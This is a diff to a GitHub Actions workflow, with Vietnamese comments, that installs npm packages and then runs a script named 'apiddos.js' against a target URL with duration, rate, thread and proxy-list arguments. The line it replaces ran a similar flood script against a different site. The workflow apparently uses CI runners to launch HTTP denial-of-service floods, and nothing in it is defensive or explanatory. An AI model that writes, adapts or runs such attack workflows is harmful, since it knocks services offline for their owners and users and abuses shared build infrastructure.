@@ -28,7 +28,13 @@ jobs:
         run: npm install uuid
       - name:
         run: npm install user-agents
+      - name:
+        run: npm install axios
+      - name:
+        run: npm install crypto
+      - name:
+        run: npm install hpack
 
       # Chạy file với hệ số
       - name: Chạy Tool
-        run: node y.js https://neuxusmmo.site/ 120 5 33 --bfm
+        run: node apiddos.js GET https://rate-limit-1.dstatbot.win/LSP4XgzM 600 5 33 proxy.txt
